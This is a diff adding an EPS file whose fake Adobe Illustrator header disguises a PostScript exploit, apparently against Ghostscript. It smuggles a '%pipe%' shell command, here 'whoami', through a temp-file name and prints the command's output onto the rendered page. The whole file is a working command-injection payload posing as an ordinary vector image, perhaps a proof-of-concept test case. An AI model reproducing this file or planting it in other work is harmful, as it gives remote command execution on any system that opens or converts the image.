@@ -1,0 +1,25 @@
+%!PS-Adobe-2.0 EPSF-1.2
+%%Creator: Adobe Illustrator(TM) 1.2d4
+%%For: OpenWindows Version 2
+%%Title: vector.eps
+%%CreationDate: 4/12/90 3:20 AM
+%%DocumentProcSets: Adobe_Illustrator_1.2d1 0 0
+%%DocumentSuppliedProcSets: Adobe_Illustrator_1.2d1 0 0
+%%BoundingBox: 17 171 567 739
+%%EndComments
+
+%-----------------------------------------------------------------------
+/cmd (whoami) def
+/tmp (x) (r) .tempfile pop def
+/strcat {exch dup length 2 index length add string dup
+        dup 4 2 roll copy length 4 -1 roll putinterval} def
+%-----------------------------------------------------------------------
+1 1 1 setrgbcolor clippath fill
+0 0 0 setrgbcolor
+0 0 0 setrgbcolor
+/Helvetica-Bold findfont 25 scalefont setfont /y 600 def 25 y moveto
+%-----------------------------------------------------------------------
+{(%pipe%) tmp strcat ( 2> /dev/null & ) strcat cmd strcat
+(r) file 4096 string readstring pop show} stopped pop
+%-----------------------------------------------------------------------
+showpage quit
